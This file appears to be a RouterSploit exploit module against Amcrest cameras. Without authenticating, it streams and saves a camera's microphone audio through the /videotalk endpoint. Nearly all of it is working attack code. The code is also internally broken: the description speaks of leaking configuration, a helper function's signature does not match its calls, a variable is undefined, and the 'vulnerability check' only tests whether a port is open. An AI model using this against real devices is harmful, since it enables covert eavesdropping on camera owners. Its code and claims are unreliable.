import argparse
import socket
import struct
import sys
import telnetlib
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    __info__ = {
        "name": "Amcrest Cameras 2.520.AC00.18.R - Unauthenticated Audio Streaming",
        "description": "Amcrest Cameras allow unauthenticated attackers to obtain the "
                       "configuration of the device remotely. A copy of the device configuration "
                       "can be obtained by accessing unprocteted URL. ",
        "authors": (
            "###",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "",
        ),
        "devices": (
            "Amcrest Cameras, firmware version 2.520.AC00.18.R"
        ),
    }

    

    def run(self):
        ##
        # Read in the specified amount of data. Continuing looping until we get it all...
        # what could go wrong?
        #
        # @return the data we read in
        ##
        def recv_all(self,sock, amount):
            data = ''
            while len(data) != amount:
                temp_data = sock.recv(amount - len(data))
                data = data + temp_data

            return data



        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(True)
        print("[+] Attempting connection to " + self.target + ":" + str(self.port))
        sock.connect((self.target , self.port))
        print("[+] Connected!")
        request = ('GET /videotalk HTTP/1.1\r\n' +
                'Host: ' + self.target + ':' + str(self.port) + '\r\n' +
                'Range: bytes=0-\r\n' +
                '\r\n')
        sock.sendall(request.encode())

        status = ''
        header = ''

        # read in the HTTP response. Store the status.
        while (header != '\r\n'):
            header = header + sock.recv(1).decode();
            if (header.find('\r\n') > 0):
                header = header.strip()
                if (len(status) == 0):
                    status = header
                header = ''

        if (status.find('200 OK') == -1):
            print('[-] Bad HTTP status. We received: "' + status + '"')
            sock.close()
            exit()
        else:
            print('[+] Downloading ' + str(args.bytes) + ' bytes of audio ...')

        total_audio = ''
        while (len(total_audio) < args.bytes):

            # read in the header length
            header_length = recv_all(sock, 4)
            hlength = struct.unpack("I", header_length)[0]
            if (hlength != 36):
                print('[-] Unexpected header length')
                sock.close()
                exit()

            # read in the header and extract the payload length
            header = recv_all(sock, hlength)
            plength = struct.unpack_from(">H", header)[0]
            if (plength != 368):
                print('[-] Unexpected payload length')
                sock.close()
                exit()

            # there is a seq no in the header but since this is over
            # tcp is sort of useless.

            dhav = header[2:6]
            if (dhav != "DHAV"):
                print('[-] Invalid header')
                exit(0)

            # extract the audio. I'm really not sure what the first 6 bytes are
            # but the last 8 serve as a type of trailer
            whatami = recv_all(sock, 6)
            audio = recv_all(sock, plength - hlength - 12)
            trailer = recv_all(sock, 8)

            if (trailer != 'dhavp\x01\x00\x00'):
                print('[-] Invalid end of frame')
                sock.close()
                exit()

            total_audio = total_audio + audio
            sys.stdout.write('\r'+ str(len(total_audio)) + " / " + str(args.bytes))
            sys.stdout.flush()

        print('')
        print('[+] Finished receiving audio.')
        print('[+] Closing socket')

        out_file = open(args.output, 'wb')
        out_file.write(total_audio)
        out_file.close()

        sock.close()

    def check(self):
        flag = False
        try:
            telnetlib.Telnet(self.target, port='80', timeout=20)
        except:
            print('connect failed')
            # return False # target is not vulnerable
        else:
            print('success')
            # return True # target is vulnerable
            flag = True
        
        return flag
